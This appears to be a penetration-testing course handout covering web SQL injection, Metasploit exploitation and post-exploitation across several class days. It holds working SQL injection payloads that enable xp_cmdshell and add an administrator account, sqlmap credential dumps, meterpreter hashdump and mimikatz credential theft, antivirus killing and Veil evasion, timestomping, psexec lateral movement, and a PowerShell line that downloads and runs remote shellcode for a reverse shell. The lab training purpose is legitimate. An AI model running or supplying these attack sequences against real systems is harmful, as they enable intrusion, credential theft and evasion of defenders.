+http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>97) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
+http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>115) WAITFOR DELAY '00:00:10'--
+http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>105) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
+http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>110) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
+http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=109) WAITFOR DELAY '00:00:10'--
+http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=110) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
+
+
+
+##########
+# Sqlmap #
+##########
+cd /home/strategicsec/toolz/sqlmap-dev/
+python sqlmap.py -u "http://54.149.82.150/bookdetail.aspx?id=2" -b
+python sqlmap.py -u "http://54.149.82.150/bookdetail.aspx?id=2" --current-user
+python sqlmap.py -u "http://54.149.82.150/bookdetail.aspx?id=2" --current-db 
+python sqlmap.py -u "http://54.149.82.150/bookdetail.aspx?id=2" --dbs 
+python sqlmap.py -u "http://54.149.82.150/bookdetail.aspx?id=2" -D BookApp --tables 
+python sqlmap.py -u "http://54.149.82.150/bookdetail.aspx?id=2" -D BookApp -T BOOKMASTER --columns 
+python sqlmap.py -u "http://54.149.82.150/bookdetail.aspx?id=2" -D BookApp -T sysdiagrams --columns 
+python sqlmap.py -u "http://54.149.82.150/bookdetail.aspx?id=2" -D BookApp -T BOOKMASTER --columns --dump 
+python sqlmap.py -u "http://54.149.82.150/bookdetail.aspx?id=2" -D BookApp -T sysdiagrams --columns --dump 
+python sqlmap.py -u "http://54.149.82.150/bookdetail.aspx?id=2" --users --passwords 
+
+
+
+
+
+
+Ok, now let's have some real fun!
+
+Go to the address below in firefox:
+http://54.149.82.150/bookdetail.aspx?id=2;exec+master..xp_cmdshell+'ping -n 8 127.0.0.1'--
+
+
+Ok, that didn't work! Let's see if we can fix it!
+
+
+
+Enabling XP-Command Shell (in your web browswer type the following URL)
+http://54.149.82.150/bookdetail.aspx?id=2;exec master..sp_configure 'show advanced options',1;reconfigure;exec master..sp_configure 'xp_cmdshell',1;reconfigure--
+
+##############################################                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ##############################################
+# Executing System Commands With xp_cmdshell #
+##############################################
+
+Go to the address below in firefox:
+http://54.149.82.150/bookdetail.aspx?id=2;exec+master..xp_cmdshell+'ping -n 8 127.0.0.1'--
+
+
+Go to the address below in firefox:
+http://54.149.82.150/bookdetail.aspx?id=2;exec+master..xp_cmdshell+'dir+>+c:\inetpub\wwwroot\dir_yourname-was-here.txt'--
+
+
+
+Check it
+--------
+http://54.149.82.150/dir_yourname-was-here.txt
+
+
+
+
+Go to the address below in firefox:
+http://54.149.82.150/bookdetail.aspx?id=2;exec+master..xp_cmdshell+'ipconfig+>+c:\inetpub\wwwroot\ipconfig_yourname-was-here.txt'--
+
+
+
+Check it
+--------
+http://54.149.82.150/ipconfig_yourname-was-here.txt
+
+
+
+
+
+Set up RDP
+----------
+http://54.149.82.150/bookdetail.aspx?id=2; EXEC sp_configure 'show advanced options',1 ; RECONFIGURE ; EXEC sp_configure 'xp_cmdshell',1 ; RECONFIGURE ; exec master..xp_cmdshell 'net user yourname P@ssw0rd!@#/add'; exec master..xp_cmdshell 'net localgroup administrators yourname /add'; EXECUTE master.dbo.xp_regwrite N'HKEY_LOCAL_MACHINE',N'SYSTEM\CurrentControlSet\Control\Terminal Server',N'fDenyTSConnections',N'REG_DWORD',0;--
+
+
+Now RDP into the host
+54.149.82.150
+
+
+Hope the quick into to web app was fun!
+
+
+###########################################################
+# Attacking an Oracle/JSP based WebApp with SQL Injection #
+###########################################################
+
+
+
+
+
+http://54.69.156.253:8081/bookcompany/
+
+
+user:	a' OR 'a'='a
+pass:	a' OR 'a'='a
+
+
+
+
+
+
+
+http://54.69.156.253:8081/bookcompany/author.jsp?id=111
+
+
+[ Search by Username ]	Joe' OR 'a'='a
+
+
+
+
+
+
+
+
+
+
+
+
+http://54.69.156.253:8081/bookcompany/faq.jsp?id=111&qid=1
+
+
+
+http://54.69.156.253:8081/bookcompany/faq.jsp?id=111&qid=1' OR '1'='1
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+http://54.69.156.253:8081/bookcompany/faq.jsp?id=111&qid=1' or 1=utl_inaddr.get_host_address((select banner from v$version where rownum=1))--
+
+
+Host is running:
+
+
+
+
+
+http://54.69.156.253:8081/bookcompany/faq.jsp?id=111&qid=1' or 1=utl_inaddr.get_host_address((SELECT user FROM dual))--
+
+User is:
+
+
+
+
+
+http://54.69.156.253:8081/bookcompany/faq.jsp?id=111&qid=1' or 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name))--
+
+Current database is:
+
+
+
+
+
+
+cd /home/strategicsec/toolz/sqlmap-dev/
+python sqlmap.py -u "http://54.69.156.253:8081/bookcompany/faq.jsp?id=111&qid=1" -b
+python sqlmap.py -u "http://54.69.156.253:8081/bookcompany/faq.jsp?id=111&qid=1" --current-user
+python sqlmap.py -u "http://54.69.156.253:8081/bookcompany/faq.jsp?id=111&qid=1" --current-db
+python sqlmap.py -u "http://54.69.156.253:8081/bookcompany/faq.jsp?id=111&qid=1" --dbs
+python sqlmap.py -u "http://54.69.156.253:8081/bookcompany/faq.jsp?id=111&qid=1" --users --passwords
+	Y
+
+
+################
+# Day 1: OSINT #
+################
+OK - it's time to get rollin!!!!!! I know that you are probably ready to scan the entire planet but I want you to do some Open Source Intelligence (OSINT) first. Here is an an OSINT report that I did for a customer of mine:
+https://s3.amazonaws.com/StrategicSec-Files/OSINT_Innophos_11242010.doc
+
+Let's see if you can do a better one than me....
+
+
+Your first challenge:
+Use the OSINT_Innophos doc as a reference and perform/document an OSINT assessment against any one of the following companies: 
+NSA
+HSBC
+Coke
+Exxon Mobil
+KPMG
+Accenture
+NewYork-Presbyterian Hospital
+Kroger
+Dillard's
+Royal Caribbean International
+
+Tools
+Here are some tools that I think you should consider using for this challenge: 
+FOCA
+Maltego
+Search Diggity
+ShodanHQ
+PassiveRecon
+EDGAR
+theHarvester
+gxfr.py
+VisualRoute
+
+Remember everyone - this challenge is due tomorrow at midnight EST - so you've got 24 hours to get this done. 
+This will be worth up to 50 points if you complete it by tomorrow at midnight EST, but it will only be worth up to 25 points if you complete it by the end of class.
+
+In order to submit your homework properly you must send it send it to:
+
+To: joe@secureninja.com
+
+
+
+********************************** Day 1 Homework **********************************
+NOTE: THIS IS AN ABSOLUTE REQUIREMENT FOR YOUR CPE CREDITS
+
+
+You must create a MS WORD document titled 'FirstName-LastName-Advanced-Pentesting-High-Security-Environments-Day1-OSINT-Report.docx' (ex: Joseph-McCray-Advanced-Pentesting-High-Security-Environments-Day1-OSINT-Report.docx).
+
+You must spell you name EXACTLY as you want it spelled on your class certificate.
+
+
+
+********************************** Day 1 Challenge **********************************
+Create a document step-by-step walkthrough (with screenshots) that details how to update and configure Ruby on the Ubuntu host for Metasploit to work properly.
+
+References:
+http://www.darkoperator.com/installing-metasploit-in-ubunt/
+http://stackoverflow.com/questions/26595620/how-to-install-ruby-2-1-4-on-ubuntu-14-04
+
+
+Remember everyone - this challenge is due tomorrow at midnight EST - so you've got 24 hours to get this done. This will be worth up to 50 points if you complete it by tomorrow at midnight EST, but it will only be worth up to 25 points if you complete it by Sunday the 12th at midnight, and up to 10 points any other time before the end of the month.
+
+
+
+
+	1
+
+
+
+
+
+############################################
+# Day 2 - Getting Familiar With Metasploit #
+############################################
+
+
+cd ~/toolz/metasploit
+
+./msfupdate
+
+./msfconsole
+	strategicsec
+
+....ooooo it looks like Metasploit now needs Ruby 2.1 well there is a great challenge for you.
+
+########################################
+# Boot up the StrategicSec Ubuntu host #
+# You can also boot up the Win7 as well#
+########################################
+ 
+- Log in to your Ubuntu host with the following credentials:
+        user: strategicsec
+        pass: strategicsec
+ 
+ 
+ 
+- I prefer to use Putty to SSH into my Ubuntu host on pentests and I'll be teaching this class in the same manner that I do pentests.
+- You can download Putty from here:
+- http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
+ 
+ 
+- For the purpose of this workshop my Win7 VM IP address is: 192.168.153.159 so anytime you see that IP you'll know that's my Win7 VM
+- 192.168.153.135 is my Ubuntu IP address so anytime you see that IP you'll know that's my Ubuntu host
+ 
+- Type the following commands
+sudo /sbin/iptables -F
+        strategicsec
+ 
+cd ~/toolz/metasploit
+ 
+
+
+ 
+ 
+###################
+# Setup your host #
+###################
+sudo apt-get update
+ 
+sudo apt-get upgrade
+ 
+sudo apt-get install git curl vim install build-essential zlib1g-dev libssl-dev libreadline-gplv2-dev
+        strategicsec
+ 
+sudo apt-get purge ruby ruby1.9.1
+        strategicsec
+ 
+
+#########################################################
+# Add some env stuff to the bottom of your .bashrc file #
+#########################################################
+vim ~/.bashrc
+ 
+export RBENV_ROOT="${HOME}/.rbenv"
+export PATH="~/.rbenv/bin:$PATH"
+export PATH="~/.rbenv/shims:$PATH"
+ 
+if [ -d "${RBENV_ROOT}" ]; then
+  export PATH="${RBENV_ROOT}/bin:${PATH}"
+  eval "$(rbenv init -)"
+fi
+ 
+ 
+#################
+# Install rbenv #
+#################
+source ~/.bashrc
+ 
+cd ~
+curl -L https://raw.github.com/fesplugas/rbenv-installer/master/bin/rbenv-installer | bash
+ 
+rbenv install 2.1.6
+ 
+rbenv global 2.1.6
+ 
+gem install bundler
+ 
+bundle install
+ 
+ 
+#####################
+# Update Metasploit #
+#####################
+cd ~/toolz/
+sudo rm -rf metasploit
+        strategicsec
+git clone https://github.com/rapid7/metasploit-framework.git
+mv metasploit-framework/ metasploit/
+cd ~/toolz/metasploit/
+sudo bash -c 'for MSF in $(ls msf*); do ln -s /home/strategicsec/toolz/metasploit/$MSF /usr/local/bin/$MSF;done'
+sudo chmod -R 777 /home/strategicsec/.msf4/*
+gem install metasploit_data_models -v '0.23.1'
+gem install bundler
+./msfupdate
+./msfconsole
+ 
+ 
+ 
+##############################################
+# Run any Linux command inside of MSFConsole #
+##############################################
+ls
+ 
+pwd
+ 
+ping -c1 yahoo.com
+ 
+nmap 192.168.153.128
+ 
+nmap yahoo.com
+ 
+ 
+ 
+ 
+ 
+##################################
+# Basic Client-Side Exploitation #
+##################################
+ 
+echo COMPROMISED > /home/strategicsec/COMPROMISED.txt                   (You can of course replace COMPROMISED with yourname)
+ 
+sudo /sbin/iptables -F
+ 
+cd ~/toolz/metasploit
+ 
+sudo ./msfconsole
+ 
+use exploit/windows/browser/ie_cgenericelement_uaf
+ 
+set ExitOnSession false
+ 
+set URIPATH /ie8
+ 
+set PAYLOAD windows/meterpreter/reverse_tcp
+ 
+set LHOST 192.168.153.159                                            (Make sure you change this to your ubuntu ip address)
+ 
+exploit -j
+ 
+ 
+- Now from the Win7 host, use Internet Explorer 8 to connect to the exploit address (local address)
+- given to you by metasploit.
+ 
+- The address will be something like:
+ 
+http://192.168.153.159:8080/ie8                                            (Make sure you change this to your ubuntu ip address)
+ 
+ 
+ 
+- This will simulate a victim clicking on your malicious link and being exploited with a browser exploit.
+ 
+ 
+###########################
+# Client-Side Enumeration #
+###########################
+ 
+ 
+- You can list the active sessions by typing:
+ 
+sessions -l
+ 
+ 
+ 
+ 
+- You can "interact" with any active session by typing sessions -i 3 (replace 3 with the session number you want to interact with)
+ 
+ 
+sessions -i 1
+ 
+ 
+ 
+ 
+ 
+- You should now see Metasploit's meterpreter prompt.
+ 
+ 
+********************************** Figure out who and where you are **********************************
+ 
+meterpreter> sysinfo
+ 
+ 
+meterpreter> getuid
+ 
+ 
+meterpreter> ipconfig
+ 
+ 
+meterpreter> run post/windows/gather/checkvm
+ 
+ 
+meterpreter> run get_local_subnets
+ 
+ 
+ 
+********************************** Escalate privileges and get hashes **********************************
+ 
+ 
+meterpreter> use priv
+ 
+ 
+--Option 1: GetSystem
+meterpreter> getsystem
+ 
+--Option 2:
+meterpreter > run post/windows/escalate/getsystem
+ 
+--Option 3:
+meterpreter> background
+back
+use post/windows/escalate/droplnk
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.153.159                                            (Make sure you change this to your ubuntu ip address)
+set LPORT 1234
+exploit
+ 
+--Option 4:
+use exploit/windows/local/bypassuac
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.153.159                                            (Make sure you change this to your ubuntu ip address)
+set LPORT 12345
+exploit
+ 
+--Option 5:
+use exploit/windows/local/service_permissions
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.153.159                                            (Make sure you change this to your ubuntu ip address)
+set LPORT 5555
+exploit
+ 
+--Option 6:
+use exploit/windows/local/trusted_service_path
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.153.159                                            (Make sure you change this to your ubuntu ip address)
+set LPORT 4567
+exploit
+ 
+ 
+--Option 7:
+use exploit/windows/local/ppr_flatten_rec
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.153.159                                            (Make sure you change this to your ubuntu ip address)
+set LPORT 7777
+exploit
+ 
+--Option 8:
+use exploit/windows/local/ms_ndproxy
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.153.159                                            (Make sure you change this to your ubuntu ip address)
+set LPORT 7788
+exploit
+ 
+ 
+--Option 9:
+use exploit/windows/local/ask
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.153.159                                            (Make sure you change this to your ubuntu ip address)
+set LPORT 7799
+exploit
+ 
+ 
+meterpreter > getuid
+Server username: win7-64-victim\Workshop
+meterpreter > getsystem
+...got system (via technique 1).
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+ 
+--------------------------------------------------------
+ 
+meterpreter> run killav
+ 
+meterpreter> run post/windows/gather/hashdump
+ 
+meterpreter > ps                (search for a process running as NT AUTHORITY\SYSTEM)
+ 
+meterpreter > migrate 2800      (your process id WILL NOT be 2800, but make sure you use one that is running at NT AUTHORITY\SYSTEM)
+ 
+meterpreter> run post/windows/gather/credentials/credential_collector
+ 
+ 
+********************************** Steal Tokens **********************************
+ 
+meterpreter > getsystem
+ 
+meterpreter > use incognito
+ 
+meterpreter > list_tokens -u
+ 
+meterpreter > list_tokens -g
+ 
+meterpreter > impersonate_token                         <-- choose who you want to impersonate but be sure to use 2 slashes in the name (ex: impersonate_token domain\\user)
+ 
+meterpreter> getuid
+ 
+ 
+************ Stealing credentials and certificates ************
+- NOTE: Most of the stuff after 'kerberos' DOES NOT work, but is given here so you know the correct syntax to use when connected to AD or dealing with smart/CAC cards.
+ 
+meterpreter > getsystem
+ 
+meterpreter > load mimikatz
+ 
+meterpreter > kerberos
+ 
+meterpreter > mimikatz_command -f sekurlsa::logonPasswords -a "full"
+ 
+meterpreter > msv                                                               <-- Your AD password
+ 
+meterpreter > livessp                                                           <-- Your Windows8 password
+ 
+meterpreter > ssp                                                               <-- Your outlook password
+ 
+meterpreter > tspkg                                                             <-- Your AD password
+ 
+meterpreter > wdigest                                                           <-- Your AD password
+ 
+meterpreter > mimikatz_command -f crypto::listStores
+ 
+meterpreter > mimikatz_command -f crypto::listCertificates
+ 
+meterpreter > mimikatz_command -f crypto::exportCertificates CERT_SYSTEM_STORE_CURRENT_USER
+ 
+meterpreter > mimikatz_command -f crypto::patchcapi
+ 
+meterpreter> search -d <directory> -f <file-pattern>
+ 
+ 
+********************************** Enumerate the host you are on **********************************
+ 
+meterpreter > run getcountermeasure
+ 
+meterpreter> run winenum
+ 
+meterpreter > run post/windows/gather/enum_applications
+ 
+meterpreter > run post/windows/gather/enum_logged_on_users
+ 
+meterpreter > run post/windows/gather/usb_history
+ 
+meterpreter > run post/windows/gather/enum_shares
+ 
+meterpreter > run post/windows/gather/enum_snmp
+ 
+meterpreter> reg enumkey -k HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+ 
+ 
+********************************** Prove access **********************************
+ 
+meterpreter> upload /home/strategicsec/COMPROMISED.txt c:\\
+ 
+meterpreter > timestomp C:\\COMPROMISED.txt -v
+ 
+meterpreter > timestomp C:\\COMPROMISED.txt -m "12/12/2015 12:12:12"
+ 
+meterpreter > timestomp C:\\COMPROMISED.txt -v
+ 
+------------------------------------------------------------
+- Now it is time to work on some anti-virus evasion. Veil is the new tool on the scene for AV evasion.
+sudo pip install PyInstaller
+        strategicsec
+ 
+cd /home/strategicsec/toolz/Veil-Evasion/setup
+ 
+sudo ./setup.sh
+        /home/strategicsec/toolz/metasploit/            (when it asks for the path to metasploit)
+ 
+cd /home/strategicsec/toolz/Veil-Evasion/
+ 
+sudo python Veil-Evasion.py
+ 
+update
+ 
+clean
+ 
+y
+ 
+list
+ 
+info 5
+ 
+use 5
+ 
+set LHOST 192.168.153.159
+ 
+info
+ 
+generate
+ 
+        payload         (when it asks for a base name)
+ 
+exit
+ 
+sudo mv /usr/share/veil-output/compiled/test.exe /home/strategicsec/            (my file path for test.exe might be different)
+ 
+sudo chmod 777 /home/strategicsec/test.exe
+ 
+cd ~/toolz/metasploit
+ 
+sudo ./msfconsole  -r /usr/share/veil-output/handlers/test_handler.rc
+ 
+ 
+- From your Win7 host use WinSCP to copy test.exe from the Ubuntu host to your Win7 desktop.
+- double click test.exe and see if you get a meterpreter session
+ 
+ 
+ 
+use exploit/windows/local/ask
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.153.159                                            (Make sure you change this to your ubuntu ip address)
+set LPORT 7799
+exploit
+ 
+ 
+meterpreter > getuid
+Server username: win7-64-victim\Workshop
+meterpreter > getsystem
+...got system (via technique 1).
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+ 
+meterpreter> ps
+ 
+meterpreter> migrate 2110                                       (Make sure this process is running as: NT AUTHORITY\SYSTEM
+ 
+meterpreter> run killav
+ 
+meterpreter> run post/windows/gather/hashdump
+ 
+meterpreter> run post/windows/gather/credentials/credential_collector
+ 
+meterpreter > load mimikatz
+ 
+meterpreter > kerberos
+ 
+meterpreter > background
+ 
+exit -y
+********************************** Day 2 Homework **********************************
+Create a word document with screenshots of your performing all of the tasks that we did today (Metasploit/Veil tasks).
+ 
+Send that homework to me and Kelly so you can get your points.
+ 
+ 
+********************************** Day 2 Challenge 1 **********************************
+ 
+Give a detailed walk-through the covers the basics of Veil. Use the references below to help you with ideas of what you can put in your walk-through.
+ 
+References:
+https://sathisharthars.wordpress.com/2014/06/23/evade-antivirus-and-bypass-uac-in-windows-7-using-metasploit/
+http://pen-testing.sans.org/blog/2013/07/12/anti-virus-evasion-a-peek-under-the-veil
+http://www.security-sleuth.com/sleuth-blog/2015/2/3/using-veil-with-metasploit
+https://www.veil-framework.com/guidesvideos/
+ 
+ 
+ 
+ 
+********************************** Day 2 Challenge 2**********************************
+ 
+Demonstrate how to SAFELY test your Veil payloads against multiple anti-virus vendors without allowing them to develop signatures against your payload.
+ 
+References:
+https://sathisharthars.wordpress.com/2014/06/07/evading-antivirus-using-veil-framework-in-kali-linux/
+https://www.veil-framework.com/tag/virustotal/
+
+
+********************************** Enumerate the network you are on **********************************
+
+meterpreter > run netenum
+
+meterpreter > run netenum -ps -r 192.168.153.0/24
+
+meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.153.0/24
+
+
+
+********************************** Set up your Pivot **********************************
+
+meterpreter > background
+							<-- background the session
+	You want to get back to this prompt: 
+	msf exploit(handler) > back 			<--- you need to get to main msf> prompt
+
+
+
+	sessions -l					<-- Find a session you want to pivot through (note the IP and session number)
+	
+	Now set up Pivot with a route add
+	---------------------------------
+
+route print
+
+route add 192.168.153.145 255.255.255.0 1			<-- Use correct session id (2), it may be 3, or 4 (make sure you are on msf> prommpt, not meterpreter)
+
+
+route print 						<----- verify new route
+
+********************************** Scan through your Pivot **********************************
+
+use auxiliary/scanner/portscan/tcp			<-- Run aux modules through your pivot
+
+set THREADS 10
+
+set RHOSTS 192.168.153.0/24				<-- Keep changing this IP and re-running the scan until you find something you want to attack
+
+set PORTS 445 
+
+run
+
+
+********************************** Lateral movement through your Pivot **********************************
+
+-- Option 1:
+use exploit/windows/smb/psexec
+
+set RHOST 192.168.153.145
+
+set LPORT 2345
+
+set SMBUser Workshop
+
+set SMBPass password
+
+exploit
+
+
+
+
+-- Option 2:
+use exploit/windows/smb/psexec
+
+set SMBUser Workshop
+
+set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+
+set payload windows/meterpreter/reverse_tcp
+
+set RHOST 192.168.153.145			
+
+set LHOST 192.168.153.159
+
+set LPORT 5678
+
+exploit
+
+
+
+-- Option 3:
+background
+use auxiliary/admin/smb/upload_file
+
+set SMBUser Workshop
+
+set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+
+set LPATH /home/strategicsec/binaries/wce.exe
+
+set RPATH "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\wce.exe"
+
+set RHOST 192.168.153.145			
+
+run
+
+
+
+-- Option 4:
+use auxiliary/admin/smb/upload_file
+
+set SMBUser Workshop
+
+set SMBPass password
+
+set LPATH /home/strategicsec/binaries/wce.exe
+
+set RPATH "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\wce.exe"
+
+set RHOST 192.168.153.145			
+
+run
+
+
+-- Option 5:
+use exploit/multi/handler
+set ExitOnSession false
+set payload windows/meterpreter/reverse_https
+set LHOST 192.168.153.159
+set LPORT 4433
+set EXITFUNC thread
+exploit -j
+
+
+
+sessions -i 1
+shell
+powershell -command "IEX (New-Object Net.WebClient).DownloadString('https://s3.amazonaws.com/StrategicSec-Files/Powersploit/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.153.159 -Lport 4433 -Force"
+
+
+
+
+
+
+
+###################
+# Socks Tunneling #
+###################
+
+sudo vi /etc/proxychains.conf				<--- Make sure that last line of the file is: socks4  127.0.0.1 1080
+
+	--- Open a duplicate putty session to your Ubuntu host
+	sudo vi /etc/proxychains.conf
+	
+	Comment out the proxy_dns, change the 9050 (tor port) to the metasploit socks proxy port (1080) and save it.
+	socks4	127.0.0.1 1080
+
+********************************** Set up a Socks Proxy through your Pivot **********************************
+
+
+use auxiliary/server/socks4a
+
+set SRVHOST 127.0.0.1
+
+set SRVPORT 1080
+
+run
+
+	--- Go back to your other putty session with the meterpreter shell
+cd ~
+
+proxychains nmap -sT -PN -vv -sV --script=smb-os-discovery.nse -p 445 192.168.153.0/24		<--- This is going to be really slow
+
+proxychains nmap -sT -PN -n -sV -p 21,22,23,25,80,110,139,443,1433,1521,3306,3389,8080,10000 192.168.153.0/24		<--- This is going to be really slow
+
+
+	--- Close the duplicate putty session to your Ubuntu host
+
+
+
+
+********************************** Homework/Challenge Time **********************************
+ 
+ 
+Your second challenge:
+Document (with screenshots) how you got Metasploit PSexec functionality working against the Windows 7 VM I have provided you.
+ 
+Remember everyone - this challenge is due tomorrow at midnight EST - so you've got 24 hours to get this done.
+This will be worth up to 50 points if you complete it by tomorrow at midnight EST, but it will only be worth up to 25 points if you complete it by Sunday the 12th at midnight, and up to 10 points any other time before the end of the month.
+ 
+In order to submit your homework properly you must send it send it to:
+ 
+To: joe@stra...(you know my email)
+CC: mhelody@stra...(you know the company name)
+ 
+ 
+********************************** Day 2 Homework **********************************
+NOTE: THIS IS AN ABSOLUTE REQUIREMENT FOR YOUR CPE CREDITS
+ 
+Go through ALL of the steps in today's content and create a walk-through document with screenshots showing that you accomplished each task covered today
+
+You must create a MS WORD document titled 'FirstName-LastName-Advanced-Pentesting-High-Security-Environments-Day2-Metasploit-Basics.docx' (ex: Joseph-McCray-Advanced-Pentesting-High-Security-Environments-Day2-Metasploit-Basics.docx).
+ 
+You must spell you name EXACTLY as you want it spelled on your class certificate.
+ 
+ 
+ 
+********************************** Day 2 Challenge **********************************
+Create a document step-by-step walkthrough (with screenshots) that shows how you got Metasploit's SMB Relay to work against the Win7 host
+ 
+References:
+http://carnal0wnage.attackresearch.com/2012/11/windows-7-and-smb-relay.html
+http://pen-testing.sans.org/blog/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python/comment-page-1/
+
+Remember everyone - this challenge is due tomorrow at midnight EST - so you've got 24 hours to get this done.
+
+
+
+######################
+# Simple Exploit Dev #
+######################
+ 
+- Inside of your Windows7 VM - download the following file to the Desktop:
+https://s3.amazonaws.com/StrategicSec-Files/SimpleExploitLab.zip
+ 
+- Extract this zip file to your Desktop
+ 
+- Go to folder C:\Users\Workshop\Desktop\ExploitLab\2-VulnServer, and run vulnserv.exe
+ 
+- Open a new command prompt and type:
+nc localhost 9999
+ 
+- In the new command prompt window where you ran nc type:
+HELP
+ 
+- Go to folder C:\Users\Workshop\Desktop\ExploitLab\4-AttackScripts
+- Right-click on 1-simplefuzzer.py and choose the option edit with notepad++
+ 
+- Now double-click on 1-simplefuzzer.py
+- You'll notice that vulnserv.exe crashes. Be sure to note what command and the number of As it crashed on.
+ 
+ 
+- Restart vulnserv, and run 1-simplefuzzer.py again. Be sure to note what command and the number of As it crashed on.
+ 
+- Now go to folder C:\Users\Workshop\Desktop\ExploitLab\3-OllyDBG and start OllyDBG. Choose 'File' -> 'Attach' and attach to process vulnserv.exe
+ 
+- Go back to folder C:\Users\Workshop\Desktop\ExploitLab\4-AttackScripts and double-click on 1-simplefuzzer.py.
+ 
+- Take note of the registers (EAX, ESP, EBP, EIP) that have been overwritten with As (41s).
+ 
+- Now isolate the crash by restarting your debugger and running script 2-3000chars.py
+ 
+- Calculate the distance to EIP by running script 3-3000chars.py
+- This script sends 3000 nonrepeating chars to vulserv.exe and populates EIP with the value: 396F4338
+ 
+4-count-chars-to-EIP.py
+- In the previous script we see that EIP is overwritten with 396F4338 is 8 (38), C (43), o (6F), 9 (39)
+- so we search for 8Co9 in the string of nonrepeating chars and count the distance to it
+ 
+5-2006char-eip-check.py
+- In this script we check to see if our math is correct in our calculation of the distance to EIP by overwriting EIP with 42424242
+ 
+6-jmp-esp.py
+- In this script we overwrite EIP with a JMP ESP (6250AF11) inside of essfunc.dll
+ 
+7-first-exploit
+- In this script we actually do the stack overflow and launch a bind shell on port 4444
+ 
+8 - Take a look at the file vulnserv.rb and place it in your Ubuntu host via SCP or copy it and paste the code into the host.
+ 
+ 
+------------------------------
+ 
+cd /home/strategicsec/toolz/metasploit/modules/exploits/windows/misc
+ 
+vi vulnserv.rb
+ 
+ 
+ 
+cd ~/toolz/metasploit
+ 
+./msfconsole
+ 
+ 
+ 
+use exploit/windows/misc/vulnserv
+set PAYLOAD windows/meterpreter/bind_tcp
+set RHOST 192.168.153.133
+set RPORT 9999
+exploit
+ 
+ 
+********************************** Day 3 Homework **********************************
+NOTE: THIS IS AN ABSOLUTE REQUIREMENT FOR YOUR CPE CREDITS
+ 
+ 
+You must create a MS WORD document titled 'FirstName-LastName-MSF-Day3.docx' (ex: Joseph-McCray-MSF-Day3.docx) that shows you completing all of the tasks covered in today's lesson.
+ 
+You must spell you name EXACTLY as you want it spelled on your class certificate.
+ 
+ 
+********************************** Day 3 Challenge **********************************
+Create a document step-by-step walkthrough (with screenshots) that shows how you got Metasploit's VirusTotal submission capability to work
+ 
+References:
+https://community.rapid7.com/community/metasploit/blog/2014/01/10/metasploit-now-supports-malware-analysis-via-virustotal
+http://pentestit.de/metasploit-virustotal-checks/
+##############################
+# Metasploit Unlimited Day 4 #
+##############################
+ 
+ 
+sudo /sbin/iptables -F
+        strategicsec
+ 
+cd ~/toolz/metasploit
+ 
+######################################
+# Writing Meterpreter Resource Files #
+######################################
+ 
+ 
+- In this lab we are going to create a binary payload via msfpayload then craft a .rc file that automates the process to setup the multi handler listener.
+ 
+- We will start off by creating the msfvenom
+ 
+./msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=192.168.153.159 -f exe > /home/strategicsec/Desktop/meterpreter.exe
+ 
+sudo chmod 777 /home/strategicsec/Desktop/meterpreter.exe
+ 
+- In the syntax above, we set the payload, set the local host address to connect back too, then redirected the malicious payload to our desktop by issuing the correct path. We will also change the permissions on it to 777 just to make it easy for us to use WinSCP to copy it over to our Win7 machine.
+ 
+- Next we are going to create a .rc (resource file) file that will automate the process for setting up a listener.
+ 
+- Navigate to the /home/strategicsec/toolz/metasploit/ so that when you create the .rc file you can save it in the working directory.
+ 
+ 
+- Type 'touch meterpreter.rc' to create the file.
+touch meterpreter.rc
+ 
+- Type 'echo use exploit/multi/handler  >> meterpreter.rc' to be appended to the .rc file.
+echo use exploit/multi/handler  >> meterpreter.rc
+ 
+- Type 'echo set PAYLOAD windows/meterpreter/reverse_tcp  >> meterpreter.rc' to be appended to the .rc file.
+echo set PAYLOAD windows/meterpreter/reverse_tcp  >> meterpreter.rc
+ 
+- Type 'echo set LHOST 192.168.153.159>> meterpreter.rc' to be appended to the .rc file.
+echo set LHOST 192.168.153.159>> meterpreter.rc
+ 
+- Type 'echo exploit -j -z >> meterpreter.rc' to be appended to the .rc file.
+echo exploit -j -z >> meterpreter.rc
+ 
+- Then cat the meterpreter.rc out to verify that everything in the file looks ok.
+cat meterpreter.rc
+ 
